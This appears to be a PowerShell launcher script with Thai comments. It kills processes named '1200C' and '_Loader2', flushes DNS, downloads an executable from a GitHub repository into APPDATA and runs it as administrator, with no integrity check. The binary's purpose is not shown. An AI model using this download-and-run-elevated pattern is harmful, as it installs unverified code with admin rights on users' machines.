# 1. สั่งปิดโปรแกรมเดิมก่อน
Stop-Process -Name "1200C" -ErrorAction SilentlyContinue
Stop-Process -Name "_Loader2" -ErrorAction SilentlyContinue

# 2. กำหนด Path (เปลี่ยนชื่อไฟล์เป็น 1200C.exe ตามที่คุณตั้งไว้)
$exePath = "$env:APPDATA\1200C.exe"

# 3. ล้าง DNS Cache
ipconfig /flushdns

# 4. ตั้งค่า URL (ใช้ชื่อ Repo 1200D.ps1 ที่ถูกต้อง)
$url = "https://github.com/lubyralph6-maker/1200D.ps1/raw/main/1200C.exe?v=$([guid]::NewGuid())"

# 5. ดาวน์โหลดไฟล์
try {
    Write-Host "Downloading and starting 1200C..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing
} catch {
    Write-Host "Error: Cannot download 1200C from GitHub!" -ForegroundColor Red
    exit
}

# 6. รันโปรแกรมทันที
if (Test-Path $exePath) {
    Write-Host "Launching 1200C..." -ForegroundColor Green
    Start-Process -FilePath $exePath -Verb RunAs
}
